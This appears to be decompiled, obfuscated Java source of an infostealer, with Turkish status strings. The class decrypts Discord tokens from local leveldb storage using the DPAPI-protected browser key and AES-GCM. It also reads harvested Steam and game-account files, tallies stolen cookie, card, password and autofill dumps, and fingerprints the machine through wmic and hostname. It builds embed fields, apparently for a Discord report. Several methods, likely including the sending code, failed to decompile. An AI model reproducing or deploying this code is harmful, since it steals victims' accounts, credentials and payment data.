package 0.0.0.0;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashSet;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.apache.commons.io.FileUtils;

public class 0h {
   private static final String 0 = System.getenv("APPDATA") + "/discord";
   String 1 = System.getenv("LOCALAPPDATA") + "\\Microsoft";
   String 2 = this.0d();
   File 3;
   0o 4;
   String[] 5;
   String 6;

   public _h/* $FF was: 0h*/() {
      this.3 = new File(this.1 + File.separator + this.2 + ".zip");
      this.4 = new 0o();
      this.5 = 0o.0(this.3);
      this.6 = this.5[0];
   }

   public void _/* $FF was: 0*/() {
      HashSet<String> sentMessages = new HashSet();
      boolean tokenFound = false;
      File[] files = (new File(0 + "/Local Storage/leveldb")).listFiles(File::isFile);
      if (files != null) {
         File[] var4 = files;
         int var5 = files.length;

         for(int var6 = 0; var6 < var5; ++var6) {
            File file = var4[var6];
            if (file.getName().endsWith(".ldb")) {
               try {
                  String parsed = FileUtils.readFileToString(file, StandardCharsets.UTF_8);
                  Matcher matcher = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)").matcher(parsed);
                  if (matcher.find()) {
                     tokenFound = true;
                     String reader = FileUtils.readFileToString(new File(0 + "/Local State"), StandardCharsets.UTF_8);
                     JsonObject json = (new JsonParser()).parse(reader).getAsJsonObject();
                     byte[] key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();
                     key = Base64.getDecoder().decode(key);
                     key = Arrays.copyOfRange(key, 5, key.length);
                     key = Crypt32Util.cryptUnprotectData(key);
                     byte[] tokens = Base64.getDecoder().decode(matcher.group().split("dQw4w9WgXcQ:")[1].getBytes());
                     Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                     cipher.init(2, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(tokens, 3, 15)));
                     String foundTokens = new String(cipher.doFinal(Arrays.copyOfRange(tokens, 15, tokens.length)), StandardCharsets.UTF_8);
                     ArrayList allTokens = new ArrayList(Arrays.asList(foundTokens.split("\n")));

                     try {
                        if (!allTokens.isEmpty()) {
                           this.0((String)allTokens.get(0), sentMessages);
                        }
                     } catch (Exception var18) {
                        throw var18;
                     }
                  }
               } catch (Exception var19) {
               }
            }
         }
      }

      try {
         if (!tokenFound) {
            this.0(sentMessages);
         }

      } catch (Exception var17) {
         throw var17;
      }
   }

   private String _/* $FF was: 0*/() {
      Random random = new Random();
      int red = random.nextInt(256);
      int green = random.nextInt(256);
      int blue = random.nextInt(256);
      return String.format("#%02x%02x%02x", red, green, blue);
   }

   private void _/* $FF was: 0*/(String param1, HashSet<String> param2) {
      // $FF: Couldn't be decompiled
   }

   private void _/* $FF was: 0*/(HashSet<String> param1) {
      // $FF: Couldn't be decompiled
   }

   private JsonObject _/* $FF was: 0*/(String name, String value) {
      JsonObject field = new JsonObject();
      field.addProperty("name", name);
      field.addProperty("value", value);
      field.addProperty("inline", true);
      return field;
   }

   private JsonObject _/* $FF was: 0*/() {
      JsonObject emptyField = new JsonObject();
      emptyField.addProperty("name", "");
      emptyField.addProperty("value", "");
      emptyField.addProperty("inline", true);
      return emptyField;
   }

   private JsonObject _/* $FF was: 1*/() {
      JsonObject emptyField2 = new JsonObject();
      emptyField2.addProperty("name", "\u200b");
      emptyField2.addProperty("value", "\u200b");
      emptyField2.addProperty("inline", false);
      return emptyField2;
   }

   private String _/* $FF was: 1*/() {
      StringBuilder content = new StringBuilder();
      String computerName = this.0d();

      try {
         if (computerName.equals("Yokki")) {
            return "Bilgisayar adı alınamadı.";
         }
      } catch (IOException var8) {
         throw var8;
      }

      String filePath = System.getenv("LOCALAPPDATA") + "\\Microsoft\\" + computerName + "\\Game\\Sonoyuncu.txt";

      try {
         BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(filePath), StandardCharsets.UTF_8));

         while(true) {
            String line;
            String var10000 = line = reader.readLine();

            try {
               if (var10000 != null) {
                  content.append(line).append("\n");
                  continue;
               }
            } catch (IOException var6) {
               throw var6;
            }

            reader.close();
            return content.toString();
         }
      } catch (IOException var7) {
         return "Yokki";
      }
   }

   private String _/* $FF was: 2*/() {
      String computerName = this.0d();

      try {
         if (computerName.equals("Unknown")) {
            return "Bilgisayar adı alınamadı.";
         }
      } catch (IOException var6) {
         throw var6;
      }

      String filePath = System.getenv("LOCALAPPDATA") + "\\Microsoft\\" + computerName + "\\Steam\\steam.txt";

      try {
         BufferedReader reader = new BufferedReader(new FileReader(filePath));

         String line;
         while((line = reader.readLine()) != null) {
            if (line.contains("Profile URL:")) {
               return line.substring(line.indexOf("Profile URL: ") + "Profile URL: ".length()).trim();
            }
         }

         reader.close();
      } catch (IOException var5) {
      }

      return "Profile URL: bulunamadı.";
   }

   private String _/* $FF was: 3*/() {
      String computerName = this.0d();

      try {
         if (computerName.equals("Unknown")) {
            return "Bilgisayar adı alınamadı.";
         }
      } catch (IOException var6) {
         throw var6;
      }

      String filePath = System.getenv("LOCALAPPDATA") + "\\Microsoft\\" + computerName + "\\Steam\\steam.txt";

      try {
         BufferedReader reader = new BufferedReader(new FileReader(filePath));

         String line;
         while((line = reader.readLine()) != null) {
            if (line.contains("Steam Level:")) {
               return line.substring(line.indexOf("Steam Level: ") + "Steam Level: ".length()).trim();
            }
         }

         reader.close();
      } catch (IOException var5) {
      }

      return "Profile URL: bulunamadı.";
   }

   private String _/* $FF was: 4*/() {
      StringBuilder content = new StringBuilder();
      String computerName = this.0d();

      try {
         if (computerName.equals("Yokki")) {
            return "Yokki";
         }
      } catch (IOException var8) {
         throw var8;
      }

      String filePath = System.getenv("LOCALAPPDATA") + "\\Microsoft\\" + computerName + "\\Game\\Craftrise.txt";

      try {
         BufferedReader reader = new BufferedReader(new FileReader(filePath));

         while(true) {
            String line;
            String var10000 = line = reader.readLine();

            try {
               if (var10000 != null) {
                  content.append(line).append("\n");
                  continue;
               }
            } catch (IOException var6) {
               throw var6;
            }

            reader.close();
            return content.toString();
         }
      } catch (IOException var7) {
         return "Yokki";
      }
   }

   private String _/* $FF was: 5*/() {
      // $FF: Couldn't be decompiled
   }

   private int _/* $FF was: 0*/(File directory) {
      int totalLines = 0;
      File[] files = directory.listFiles();
      if (files != null) {
         File[] var4 = files;
         int var5 = files.length;

         for(int var6 = 0; var6 < var5; ++var6) {
            File file = var4[var6];
            if (file.isDirectory()) {
               totalLines += this.0(file);
            } else if (file.getName().equalsIgnoreCase("cookie.txt")) {
               try {
                  BufferedReader reader = new BufferedReader(new FileReader(file));

                  try {
                     while(reader.readLine() != null) {
                        ++totalLines;
                     }
                  } catch (IOException var9) {
                     throw var9;
                  }

                  reader.close();
               } catch (IOException var10) {
               }
            }
         }
      }

      return totalLines;
   }

   private String _/* $FF was: 6*/() {
      // $FF: Couldn't be decompiled
   }

   private int _/* $FF was: 1*/(File directory) {
      int totalLines = 0;
      File[] files = directory.listFiles();
      if (files != null) {
         File[] var4 = files;
         int var5 = files.length;

         for(int var6 = 0; var6 < var5; ++var6) {
            File file = var4[var6];
            if (file.isDirectory()) {
               totalLines += this.1(file);
            } else if (file.getName().equalsIgnoreCase("card.txt")) {
               try {
                  BufferedReader reader = new BufferedReader(new FileReader(file));

                  try {
                     while(reader.readLine() != null) {
                        ++totalLines;
                     }
                  } catch (IOException var9) {
                     throw var9;
                  }

                  reader.close();
               } catch (IOException var10) {
               }
            }
         }
      }

      return totalLines;
   }

   private String _/* $FF was: 7*/() {
      // $FF: Couldn't be decompiled
   }

   private int _/* $FF was: 2*/(File directory) {
      int totalLines = 0;
      File[] files = directory.listFiles();
      if (files != null) {
         File[] var4 = files;
         int var5 = files.length;

         for(int var6 = 0; var6 < var5; ++var6) {
            File file = var4[var6];
            if (file.isDirectory()) {
               totalLines += this.2(file);
            } else if (file.getName().equalsIgnoreCase("password.txt")) {
               try {
                  BufferedReader reader = new BufferedReader(new FileReader(file));

                  try {
                     while(reader.readLine() != null) {
                        ++totalLines;
                     }
                  } catch (IOException var9) {
                     throw var9;
                  }

                  reader.close();
               } catch (IOException var10) {
               }
            }
         }
      }

      return totalLines;
   }

   private String _/* $FF was: 8*/() {
      // $FF: Couldn't be decompiled
   }

   private int _/* $FF was: 3*/(File directory) {
      int totalLines = 0;
      File[] files = directory.listFiles();
      if (files != null) {
         File[] var4 = files;
         int var5 = files.length;

         for(int var6 = 0; var6 < var5; ++var6) {
            File file = var4[var6];
            if (file.isDirectory()) {
               totalLines += this.3(file);
            } else if (file.getName().equalsIgnoreCase("autofills.txt")) {
               try {
                  BufferedReader reader = new BufferedReader(new FileReader(file));

                  try {
                     while(reader.readLine() != null) {
                        ++totalLines;
                     }
                  } catch (IOException var9) {
                     throw var9;
                  }

                  reader.close();
               } catch (IOException var10) {
               }
            }
         }
      }

      return totalLines;
   }

   private String _/* $FF was: 9*/() {
      // $FF: Couldn't be decompiled
   }

   private int _/* $FF was: 4*/(File directory) {
      int totalLines = 0;
      File[] files = directory.listFiles();
      if (files != null) {
         File[] var4 = files;
         int var5 = files.length;

         for(int var6 = 0; var6 < var5; ++var6) {
            File file = var4[var6];
            if (file.isDirectory()) {
               totalLines += this.4(file);
            } else if (file.getName().equalsIgnoreCase("Desktop.txt")) {
               try {
                  BufferedReader reader = new BufferedReader(new FileReader(file));

                  try {
                     while(reader.readLine() != null) {
                        ++totalLines;
                     }
                  } catch (IOException var9) {
                     throw var9;
                  }

                  reader.close();
               } catch (IOException var10) {
               }
            }
         }
      }

      return totalLines;
   }

   private String _a/* $FF was: 0a*/() {
      try {
         Process process = Runtime.getRuntime().exec("wmic path win32_VideoController get name");
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
         StringBuilder gpuModel = new StringBuilder();
         boolean firstLineSkipped = false;

         while(true) {
            String line;
            String var10000 = line = reader.readLine();

            label27: {
               try {
                  if (var10000 == null) {
                     break;
                  }

                  if (firstLineSkipped) {
                     break label27;
                  }
               } catch (IOException var6) {
                  throw var6;
               }

               firstLineSkipped = true;
               continue;
            }

            if (!line.trim().isEmpty()) {
               gpuModel.append(line.trim()).append(" ");
            }
         }

         process.destroy();
         return gpuModel.toString().trim();
      } catch (IOException var7) {
         return "Yokki";
      }
   }

   private String _b/* $FF was: 0b*/() {
      try {
         Process process = Runtime.getRuntime().exec("wmic cpu get name");
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
         StringBuilder processorDetails = new StringBuilder();
         boolean firstLineSkipped = false;

         while(true) {
            String line;
            String var10000 = line = reader.readLine();

            label27: {
               try {
                  if (var10000 == null) {
                     break;
                  }

                  if (firstLineSkipped) {
                     break label27;
                  }
               } catch (IOException var6) {
                  throw var6;
               }

               firstLineSkipped = true;
               continue;
            }

            if (!line.trim().isEmpty()) {
               processorDetails.append(line.trim()).append(" ");
            }
         }

         process.destroy();
         return processorDetails.toString().trim();
      } catch (IOException var7) {
         return "Yokki";
      }
   }

   private String _c/* $FF was: 0c*/() {
      // $FF: Couldn't be decompiled
   }

   String _d/* $FF was: 0d*/() {
      try {
         Process process = Runtime.getRuntime().exec("hostname");
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
         String computerName = reader.readLine();

         String var10000;
         try {
            process.destroy();
            if (computerName != null) {
               var10000 = computerName.trim();
               return var10000;
            }
         } catch (IOException var4) {
            throw var4;
         }

         var10000 = "Yokki";
         return var10000;
      } catch (IOException var5) {
         return "Yokki";
      }
   }
}
